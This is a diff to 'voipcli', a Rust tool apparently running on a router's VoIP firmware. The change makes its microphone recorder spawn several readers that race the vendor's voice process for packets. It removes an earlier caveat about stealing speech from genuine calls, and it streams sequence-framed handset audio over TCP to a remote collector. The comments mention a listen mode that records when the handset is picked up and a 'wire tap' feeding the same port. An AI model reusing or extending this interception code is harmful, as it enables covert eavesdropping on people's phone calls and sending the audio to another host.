@@ -112,6 +112,9 @@ const IOCTL_ENDPT_PACKET: c_long = 0xc01c_d10bu32 as i32 as c_long;
 const IOCTL_ENDPT_GET_PACKET: c_long = 0xc01c_d10cu32 as i32 as c_long;
 const RTP_PAYLOAD: usize = 160; // 20 ms of 8 kHz G.711
 const RTP_HDR: usize = 12;
+/// How many processes race vgw_app for the driver's packet queue. Three is where the
+/// return flattens out: our share goes 1/2 -> 2/3 -> 3/4 and each one costs a process.
+const MIC_READERS: u32 = 3;
 const IOCTL_ENDPT_SIGNAL: c_long = 0xc024_d105u32 as i32 as c_long;
 const EPSIG_RINGING: u32 = 0x0F;
 const EPSIG_RINGING_INT: u32 = 0x10; // internal-call variant used by ring_callerid_off
@@ -1029,13 +1032,7 @@ fn listen_mode(ch: u32, port: u16, number: &[u8], collector: u32, cport: u16) ->
                             // first few packets. The receive ioctl keeps producing audio for
                             // as long as the handset is up, and stealing from vgw costs
                             // nothing here because it has nowhere to forward it anyway.
-                            let sk = dial_collector(collector, cport);
-                            if sk >= 0 {
-                                let ep2 = open(DEV_ENDPOINT.as_ptr() as *const c_char, O_RDWR);
-                                if ep2 >= 0 {
-                                    record_mic_to(ch, ep2, sk, 0);
-                                }
-                            }
+                            record_mic_tcp(ch, collector, cport, 0, MIC_READERS);
                             exit(0);
                         }
                         if rec_pid > 0 {
@@ -1260,7 +1257,7 @@ fn ring_and_record(ch: u32, number: &[u8], dest: &[u8]) -> c_int {
     unsafe { usleep(400_000) };
     lsm_set_connected(ch);
     say(b"voipcli: picked up - recording the handset\n");
-    record_mic(ch, dest, 0)
+    record_mic(ch, dest, 0, MIC_READERS)
 }
 
 /// Ring the phone, wait for it to be picked up, then speak the file into it.
@@ -1336,66 +1333,76 @@ fn announce(ch: u32, number: &[u8], path: &[u8]) -> c_int {
 
 /// Record what the handset microphone is picking up.
 ///
-/// vgw_app runs the same blocking ioctl in its packet task, so each packet goes to
-/// whichever reader asks first — during one of our own injected calls that costs nothing,
-/// because vgw has nowhere to forward the audio anyway. In a genuine call it would steal
-/// half the outgoing speech, so this is meant for the calls we set up ourselves.
-fn record_mic(ch: u32, path: &[u8], secs: u32) -> c_int {
+/// vgw_app runs the same blocking ioctl in its own packet task, and the driver hands each
+/// packet to whichever reader asks for it first. One reader of ours therefore sees only
+/// about half of them, which is exactly what made the recording choppy - the missing half
+/// was not silence, it was speech that went to vgw instead.
+///
+/// Two things fix that. Several readers run at once, so our share rises: two take roughly
+/// two thirds, three about three quarters. And each packet keeps its RTP sequence number,
+/// so the collector can merge the readers back into one ordered stream instead of
+/// concatenating two interleaved halves. The framing is
+///
+///     "MIC1" once per connection, then [seq:2][len:2][payload]
+///
+/// all big-endian. The magic is what lets the collector tell a framed stream from the raw
+/// one the wire tap still sends to the same port.
+const MIC_MAGIC: [u8; 4] = *b"MIC1";
+
+/// write() can come back short on a socket, and half a frame header would desynchronise
+/// everything after it.
+fn write_all(fd: c_int, p: *const u8, n: usize) -> bool {
     unsafe {
-        let ep = open(DEV_ENDPOINT.as_ptr() as *const c_char, O_RDWR);
-        if ep < 0 {
-            say(b"voipcli: cannot open /dev/bcmendpoint0\n");
-            return 6;
+        let mut off = 0usize;
+        while off < n {
+            let k = write(fd, p.add(off) as *const c_void, n - off);
+            if k <= 0 {
+                return false;
+            }
+            off += k as usize;
         }
-        // A destination of tcp:<ip>:<port> streams straight to the PC instead of leaving a
-        // file on a router whose /var is RAM anyway.
-        let out = if path[0] == b't' && path[1] == b'c' && path[2] == b'p' && path[3] == b':' {
+        true
+    }
+}
+
+/// A file, or tcp:<ip>:<port> to stream straight to the PC instead of leaving a file on a
+/// router whose /var is RAM anyway.
+fn open_dest(path: &[u8]) -> c_int {
+    unsafe {
+        if path.len() > 4 && &path[..4] == b"tcp:" {
             let mut i = 4usize;
             let start = i;
-            while path[i] != b':' && path[i] != 0 {
+            while i < path.len() && path[i] != b':' && path[i] != 0 {
                 i += 1;
             }
             let ip = parse_ip(&path[start..i]);
-            let port = if path[i] == b':' {
+            let port = if i < path.len() && path[i] == b':' {
                 atoi(&path[i + 1..])
             } else {
                 0
             } as u16;
-            let sk = socket(AF_INET, SOCK_STREAM, 0);
-            let peer = SockaddrIn {
-                sin_family: AF_INET as u16,
-                sin_port: port.to_be(),
-                sin_addr: ip.to_be(),
-                sin_zero: [0u8; 8],
-            };
-            if sk < 0 || connect(sk, &peer as *const SockaddrIn as *const c_void, 16) < 0 {
-                say(b"voipcli: cannot reach the collector - is it listening?\n");
-                close(ep);
-                return 6;
-            }
-            sk
+            dial_collector(ip, port)
         } else {
             creat(path.as_ptr() as *const c_char, 0o644)
-        };
-        if out < 0 {
-            say(b"voipcli: cannot open the destination\n");
-            close(ep);
-            return 6;
         }
-        record_mic_to(ch, ep, out, secs)
     }
 }
 
 /// The capture loop itself, once the endpoint and destination are open.
-fn record_mic_to(ch: u32, ep: c_int, out: c_int, secs: u32) -> c_int {
+///
+/// `framed` writes the sequence-numbered form above; without it the payload goes out bare,
+/// which is what a plain file wants and what the older tooling still reads.
+fn record_mic_to(ch: u32, ep: c_int, out: c_int, secs: u32, framed: bool) -> c_int {
     unsafe {
+        if framed && !write_all(out, MIC_MAGIC.as_ptr(), 4) {
+            return 6;
+        }
         let mut buf = [0u8; 1024];
-        // EPPACKET { mediaType, data } — the driver fills both
+        // EPPACKET { mediaType, data } - the driver fills both
         let mut eppacket: [u32; 2] = [0, buf.as_mut_ptr() as u32];
         let want = if secs == 0 { 0 } else { secs * 50 }; // 50 packets per second
         let mut got: u32 = 0;
         let mut kept: u32 = 0;
-        say(b"voipcli: recording - Ctrl-C to stop\n");
         loop {
             let mut parm: [u32; 7] = [0x1c, 0, 0, eppacket.as_mut_ptr() as u32, 0, 0, 0];
             eppacket[0] = 0;
@@ -1407,19 +1414,28 @@ fn record_mic_to(ch: u32, ep: c_int, out: c_int, secs: u32) -> c_int {
                 continue;
             }
             let len = parm[4] as usize;
-            // Only audio, and only from the channel asked for; skip the RTP header so the
-            // file is raw G.711 that wav_to_alaw's counterpart can read straight back.
             // The queue carries more than voice: RTCP reports and fax frames come through
             // the same ioctl, and writing those into the stream is what made the recording
-            // crackle and break up. Keep media type 0 (RTP), version 2, and a G.711
-            // payload type - everything else is not audio.
+            // crackle. Keep media type 0 (RTP), version 2, and a G.711 payload type.
             let media_ok = eppacket[0] == 0;
             let rtp_ok = len > RTP_HDR && (buf[0] & 0xc0) == 0x80;
             let pt = buf[1] & 0x7f;
             let voice = pt == 8 || pt == 0;
             let hdr = RTP_HDR + ((buf[0] & 0x0f) as usize) * 4;
             if media_ok && rtp_ok && voice && len > hdr && len <= buf.len() {
-                write(out, buf[hdr..].as_ptr() as *const c_void, len - hdr);
+                let payload = len - hdr;
+                let ok = if framed {
+                    // The sequence number is already big-endian in the header, so it goes
+                    // out exactly as it came in.
+                    let frame = [buf[2], buf[3], (payload >> 8) as u8, payload as u8];
+                    write_all(out, frame.as_ptr(), 4)
+                        && write_all(out, buf[hdr..].as_ptr(), payload)
+                } else {
+                    write_all(out, buf[hdr..].as_ptr(), payload)
+                };
+                if !ok {
+                    break; // the collector went away
+                }
                 kept = kept.wrapping_add(1);
             }
             got = got.wrapping_add(1);
@@ -1432,17 +1448,12 @@ fn record_mic_to(ch: u32, ep: c_int, out: c_int, secs: u32) -> c_int {
             if got % 50 == 0 {
                 match chan_info(ch) {
                     Some(i) if i.opened != 0 && i.cnx_id >= 0 => {}
-                    _ => {
-                        say(b"voipcli: the call ended\n");
-                        break;
-                    }
+                    _ => break,
                 }
             }
         }
-        close(out);
-        close(ep);
         let mut m = [0u8; 64];
-        let h = b"voipcli: saved ";
+        let h = b"voipcli: reader kept ";
         m[..h.len()].copy_from_slice(h);
         let mut k = put_num(&mut m, h.len(), kept);
         let t = b" packets\n";
@@ -1451,6 +1462,75 @@ fn record_mic_to(ch: u32, ep: c_int, out: c_int, secs: u32) -> c_int {
         say(&m[..k]);
         0
     }
+}
+
+/// One reader: its own endpoint handle, its own connection, its own share of the queue.
+/// A non-zero `ip` means a collector, otherwise `path` is used.
+fn one_reader(ch: u32, path: &[u8], ip: u32, port: u16, secs: u32) -> c_int {
+    unsafe {
+        let ep = open(DEV_ENDPOINT.as_ptr() as *const c_char, O_RDWR);
+        if ep < 0 {
+            say(b"voipcli: cannot open /dev/bcmendpoint0\n");
+            return 6;
+        }
+        let framed = ip != 0 || (path.len() > 4 && &path[..4] == b"tcp:");
+        let out = if ip != 0 {
+            dial_collector(ip, port)
+        } else {
+            open_dest(path)
+        };
+        if out < 0 {
+            say(b"voipcli: cannot reach the destination - is the collector listening?\n");
+            close(ep);
+            return 6;
+        }
+        let r = record_mic_to(ch, ep, out, secs, framed);
+        close(out);
+        close(ep);
+        r
+    }
+}
+
+/// Start `readers` of them and keep the last one in this process.
+///
+/// A file destination stays single: several processes creat()ing the same path would each
+/// write from offset zero and shred the result. Only a collector takes the extra readers,
+/// which is fine, because the streaming case is the one that was dropping packets.
+fn spawn_readers(ch: u32, path: &[u8], ip: u32, port: u16, secs: u32, readers: u32) -> c_int {
+    let framed = ip != 0 || (path.len() > 4 && &path[..4] == b"tcp:");
+    let mut n = if readers < 1 {
+        1
+    } else if readers > 6 {
+        6
+    } else {
+        readers
+    };
+    if !framed {
+        n = 1;
+    }
+    unsafe {
+        let mut i = 1;
+        while i < n {
+            if fork() == 0 {
+                one_reader(ch, path, ip, port, secs);
+                exit(0);
+            }
+            usleep(20_000);
+            i += 1;
+        }
+    }
+    one_reader(ch, path, ip, port, secs)
+}
+
+/// `rec` and `ringrec`: a path, which may be tcp:<ip>:<port>.
+fn record_mic(ch: u32, path: &[u8], secs: u32, readers: u32) -> c_int {
+    say(b"voipcli: recording - Ctrl-C to stop\n");
+    spawn_readers(ch, path, 0, 0, secs, readers)
+}
+
+/// `listen`: the collector address is already parsed by the time we get here.
+fn record_mic_tcp(ch: u32, ip: u32, port: u16, secs: u32, readers: u32) -> c_int {
+    spawn_readers(ch, b"", ip, port, secs, readers)
 }
 
 /// Connect a TCP collector, or -1.
@@ -1799,7 +1879,7 @@ pub extern "C" fn main(argc: c_int, argv: *const *const c_char) -> c_int {
     // --- record the handset microphone ---
     if a1 == b"rec" {
         if argc < 4 {
-            say(b"usage: voipcli rec <ch> <file.alaw> [seconds, 0 = until stopped]
+            say(b"usage: voipcli rec <ch> <dest> [seconds, 0 = until stopped] [readers]
 ");
             return 1;
         }
@@ -1809,7 +1889,8 @@ pub extern "C" fn main(argc: c_int, argv: *const *const c_char) -> c_int {
         let n = if raw.len() > 126 { 126 } else { raw.len() };
         path[..n].copy_from_slice(&raw[..n]);
         let secs = if argc >= 5 { atoi(arg(argv, 4)) } else { 0 };
-        return record_mic(ch, &path, secs);
+        let readers = if argc >= 6 { atoi(arg(argv, 5)) } else { MIC_READERS };
+        return record_mic(ch, &path, secs, readers);
     }
 
     // --- panic button: silence ring and tones on a channel ---
